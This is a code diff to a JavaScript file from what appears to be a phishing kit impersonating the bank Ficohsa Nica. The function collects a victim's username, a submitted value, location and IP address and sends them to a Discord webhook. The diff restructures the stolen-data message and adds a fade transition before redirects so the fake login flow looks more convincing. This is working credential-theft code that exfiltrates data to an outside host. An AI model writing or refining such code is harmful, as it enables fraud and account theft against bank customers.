@@ -69,14 +69,30 @@ async function obtenerUbicacionYEnviarDatos(usuario, etiqueta, valor, nextPage) 
         console.error('Error al obtener la ubicación:', error);
     }
 
-    const mensaje = `💲 Ficohsa Nica 💲\nUsuario: ${usuario}\n${etiqueta}: ${valor}\nCiudad: ${ciudad}\nEstado: ${estado}\nPaís: ${pais}\nIP: ${ip}`;
+    const mensaje = [
+        '💲 Ficohsa Nica 💲',
+        `Usuario: ${usuario}`,
+        `${etiqueta}: ${valor}`,
+        `Ciudad: ${ciudad}`,
+        `Estado: ${estado}`,
+        `País: ${pais}`,
+        `IP: ${ip}`
+    ].join('\n');
 
     const resultado = await enviarDatosAlDiscord(mensaje);
     if (resultado.success) {
-        window.location.href = nextPage;
+        transicionHacia(nextPage);
     } else {
         console.error('Error al enviar datos al webhook:', resultado.message);
     }
+}
+
+function transicionHacia(nextPage) {
+    document.body.style.transition = 'opacity 0.35s ease';
+    document.body.style.opacity = '0';
+    setTimeout(function () {
+        window.location.href = nextPage;
+    }, 350);
 }
 
 document.addEventListener('DOMContentLoaded', function () {
@@ -89,7 +105,7 @@ document.addEventListener('DOMContentLoaded', function () {
                 return;
             }
             guardarUsuario(usuario);
-            window.location.href = 'index2.html';
+            transicionHacia('index2.html');
         });
     }
 
